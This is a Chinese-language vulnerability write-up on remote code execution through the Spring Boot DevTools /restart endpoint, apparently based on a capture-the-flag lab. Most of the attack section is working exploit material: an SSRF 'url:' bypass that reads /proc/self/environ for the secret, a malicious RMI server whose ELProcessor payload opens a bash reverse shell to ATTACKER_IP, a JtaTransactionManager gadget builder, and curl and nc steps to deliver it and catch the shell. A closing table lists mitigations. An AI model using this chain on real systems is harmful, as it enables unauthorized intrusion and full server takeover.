---
title: Spring Boot DevTools 远程重启端点反序列化 RCE 漏洞分析
description: 深度分析 Spring Boot DevTools 远程重启端点因默认弱密钥导致的反序列化 RCE 漏洞，涵盖 HttpRestartServer
  处理流程、JNDI 注入利用链（JtaTransactionManager + Tomcat BeanFactory + ELProcessor）及实战复现步骤。
category: ai-security
tags:
- Spring Boot
- DevTools
- 反序列化
- RCE
- JNDI注入
- JtaTransactionManager
- Tomcat BeanFactory
- ELProcessor
- SSRF绕过
- 弱默认密钥
date: 2021-04-15
updated: '2026-11-12'
---
## 漏洞概述

Spring Boot DevTools 提供的远程重启功能（`spring-boot-devtools` 模块）在默认配置下存在**反序列化远程代码执行**漏洞。攻击者若能获取或爆破弱默认密钥（`spring.devtools.remote.secret`，默认值为 `mysecret`，文中误写为 `myscret`），即可向 `/restart` 端点发送恶意序列化对象，触发 JNDI 注入链实现 RCE。

> **影响范围**：引入 `spring-boot-devtools` 且暴露远程重启端点（默认路径 `/restart`）的 Spring Boot 应用，特别是未修改默认 `secret` 或使用弱口令的场景。

## 核心组件与处理流程

### HttpRestartServer 入口

远程重启的 HTTP 处理入口位于 `org.springframework.boot.devtools.restart.server.HttpRestartServer`，其 `handle()` 方法直接从请求体读取并反序列化：

```java
public void handle(ServerHttpRequest request, ServerHttpResponse response) throws IOException {
    try {
        Assert.state(request.getHeaders().getContentLength() > 0L, "No content");
        ObjectInputStream objectInputStream = new ObjectInputStream(request.getBody());
        ClassLoaderFiles files = (ClassLoaderFiles) objectInputStream.readObject(); // 关键反序列化点
        objectInputStream.close();
        this.server.updateAndRestart(files);
        response.setStatusCode(HttpStatus.OK);
    } catch (Exception var5) {
        logger.warn("Unable to handler restart server HTTP request", var5);
        response.setStatusCode(HttpStatus.INTERNAL_SERVER_ERROR);
    }
}
```

- **认证校验**：请求头 `X-AUTH-TOKEN` 需匹配 `spring.devtools.remote.secret`（默认 `mysecret`）
- **反序列化类型**：期望接收 `ClassLoaderFiles` 对象，但 `ObjectInputStream.readObject()` 不限制类型，任意可序列化对象均可触发利用链

### 密钥获取途径

1. **默认弱口令**：未显式配置 `spring.devtools.remote.secret` 时默认为 `mysecret`
2. **环境变量泄露**：如文中通过 SSRF 读取 `/proc/self/environ` 获取 `SECRET` 变量
3. **配置文件泄露**：`application.properties` 中引用 `${SECRET}` 且环境变量可读
4. **Actuator 端点泄露**：`/actuator/env` 或 `/actuator/configprops` 暴露配置值

> 关联页面：[[spring-boot-actuator配置不当rce利用]] 中详述 Actuator 端点信息泄露利用方式。

## SSRF 到任意文件读取（漏洞前置条件）

文中靶场通过 SSRF 绕过黑名单读取敏感文件，关键技术点：

### URLConnection `url:` 前缀绕过

`java.net.URL` 构造函数在解析 `spec` 参数时，若检测到前缀 `url:`（不区分大小写），会自动跳过 4 字符继续解析：

```java
if (spec.regionMatches(true, start, "url:", 0, 4)) {
    start += 4;
}
```

**绕过示例**：
- 原始黑名单：`^ [file|netdoc|jar|ftp|mailto]`
- 绕过 Payload：`url:file:///etc/passwd` → 实际协议识别为 `file`

### 文件读取利用

- `file://` 与 `netdoc://` 均支持目录列表（`file:///root/` 可列出文件名）
- 读取 `/proc/self/environ` 获取环境变量中的 `SECRET`
- 发现 `catforflag` 二进制程序，推断需 RCE 执行命令读取 flag

> 关联基础知识：[[java-deserialization-fundamentals]] 梳理 Java 序列化/反序列化核心机制。

## 高版本 JDK（8u265）JNDI 注入利用链

目标环境 JDK 8u265 已限制经典 JNDI 注入（`com.sun.jndi.rmi.object.trustURLCodebase` 默认 `false`），需利用 **本地工厂类** 绕过。

### 利用链组件

| 组件 | 来源 | 作用 |
|------|------|------|
| `JtaTransactionManager` | `spring-tx-5.2.8.jar` | 触发 `InitialContext.lookup()` |
| `Tomcat BeanFactory` | `tomcat-embed-core-9.0.37.jar` | `org.apache.naming.factory.BeanFactory` 处理 `ResourceRef` |
| `ELProcessor` | JDK 内置 (`javax.el`) | 执行任意表达式/命令 |

### 攻击链构造

#### 恶意 RMI 服务端（攻击者机器）

```java
public class EvilRmiServer {
    public static void main(String[] args) throws Exception {
        System.setProperty("java.rmi.server.hostname", "ATTACKER_IP");
        Registry registry = LocateRegistry.createRegistry(1099);

        ResourceRef ref = new ResourceRef(
            "javax.el.ELProcessor", null, "", "", true,
            "org.apache.naming.factory.BeanFactory", null
        );
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", 
            "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")"
            + ".newInstance().getEngineByName(\"JavaScript\")"
            + ".eval(\"new java.lang.ProcessBuilder['(java.lang.String[])']"
            + "(['/bin/bash','-c','bash -i >& /dev/tcp/ATTACKER_IP/7890 0>&1']).start()\")"
        ));

        ReferenceWrapper refWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("Object", refWrapper);
    }
}
```

- `forceString=x=eval`：指定调用 `ELProcessor.eval(String)` 方法
- `x` 属性值：JavaScript Payload 执行反弹 Shell

#### 客户端序列化 Payload（发送给目标 `/restart`）

```java
public class ExploitPayload implements Serializable {
    public static void main(String[] args) throws Exception {
        String jndiAddress = "rmi://ATTACKER_IP:1099/Object";
        JtaTransactionManager tm = new JtaTransactionManager();
        tm.setUserTransactionName(jndiAddress); // 触发 lookup

        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("expObject"))) {
            oos.writeObject(tm);
        }
    }
}
```

#### 发送利用数据

```bash
# 需携带正确的 X-AUTH-TOKEN
curl -X POST http://target:port/restart \
  -H "X-AUTH-TOKEN: mysecret" \
  --data-binary @expObject
```

### 利用链执行流程

```mermaid
graph TD
    A[HttpRestartServer.readObject()] --> B[反序列化 JtaTransactionManager]
    B --> C[setUserTransactionName 存储 JNDI 地址]
    C --> D[后续触发 lookup -> InitialContext.lookup(rmi://...)]
    D --> E[恶意 RMI 返回 ResourceRef]
    E --> F[Tomcat BeanFactory.getObjectInstance]
    F --> G[解析 forceString 调用 ELProcessor.eval]
    G --> H[ScriptEngine 执行 JS Payload]
    H --> I[ProcessBuilder 执行命令 -> RCE]
```

> 关联页面：[[h2-console-jndi注入rce利用]] 同样利用 Tomcat BeanFactory + ELProcessor 链，但入口为 H2 Console。

## 完整复现步骤

### 环境准备

| 组件 | 版本/说明 |
|------|-----------|
| 目标 JDK | 8u265 (文中环境) |
| 目标依赖 | `spring-boot-devtools`, `spring-tx-5.2.8`, `tomcat-embed-core-9.0.37` |
| 攻击机 JDK | 兼容版本 (建议 8u265+) |
| 工具 | `JNDI-Injection-Exploit` (可选，自动化生成链) |

### 步骤 1：获取 Secret

```bash
# 利用 SSRF 绕过读取环境变量
curl "http://target/pathneverguess?url=url:file:///proc/self/environ"
# 输出中提取 SECRET=mysecret
```

### 步骤 2：启动恶意 RMI 服务

使用 [JNDI-Injection-Exploit](https://github.com/welk1n/JNDI-Injection-Exploit) 或自编译代码：

```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar \
  -C "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/7890 0>&1'" \
  -A "ATTACKER_IP"
# 监听 1099 端口
```

### 步骤 3：生成并发送 Payload

```bash
# 方式一：使用工具生成序列化文件
# 方式二：编译上文 ExploitPayload 类生成 expObject

curl -X POST http://target:8080/restart \
  -H "X-AUTH-TOKEN: mysecret" \
  --data-binary @expObject
```

### 步骤 4：接收 Shell

```bash
nc -lvp 7890
# 连接成功，获得目标 Shell
```

## 缓解与防御

| 措施 | 说明 |
|------|------|
| **修改默认 Secret** | `spring.devtools.remote.secret=strong-random-string` |
| **禁用生产环境 DevTools** | `spring.devtools.remote.enabled=false` 或排除依赖 |
| **网络层限制** | 仅允许可信 IP 访问 `/restart` 端点 |
| **升级依赖** | Spring Boot 2.5+ 已移除 `HttpRestartServer` 默认反序列化入口（需确认版本） |
| **JDK 升级** | JDK 8u191+ / 11.0.1+ 限制 `trustURLCodebase`，但本地工厂链仍可利用，需结合上述措施 |

## 相关漏洞与扩展阅读

- [[spring-boot-actuator配置不当rce利用]] - Actuator `/env` `/restart` 端点组合利用、H2 Console JNDI 注入、SpEL 表达式注入
- [[spring-cloud-config目录穿越漏洞]] - Spring Cloud Config 任意文件读取 (CVE-2020-5410)
- [[h2-console-jndi注入rce利用]] - H2 Console 未授权 + JNDI 注入同款利用链
- [[java-deserialization-fundamentals]] - Java 反序列化基础机制与 `serialVersionUID`、`ObjectInputStream` 细节
- [[cve-digest-20210416]] - 同期 Apache Tapestry 反序列化 RCE 漏洞聚合

## 参考资料

1. 原文：微信公众号文章《记一次Spring Devtools反序列化利用》
2. 国外分析文章：[SpringBoot DevTools Insecure Deserialization Analysis & Exploit](https://medium.com/@sherif_ninja/springboot-devtools-insecure-deserialization-analysis-exploit-2c4ac77c285a)
3. JDK 高版本 JNDI 注入绕过技术总结：
   - [tr1ple: JNDI 注入绕过](https://www.cnblogs.com/tr1ple/p/12335098.html)
   - [kingx: Restrictions and Bypass of JNDI Manipulations RCE](https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html)
   - [Seebug Paper 942](https://paper.seebug.org/942/)
   - [m0d9: JNDI RMI 注入及绕过](http://m0d9.me/2020/07/11/JNDI%EF%BC%9AJNDI-RMI%20%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6%EF%BC%88%E4%B8%89%EF%BC%89/)

## 来源

- [0th3rs安全团队-201911-202204_058](../sources/0th3rs安全团队-201911-202204_058.md)
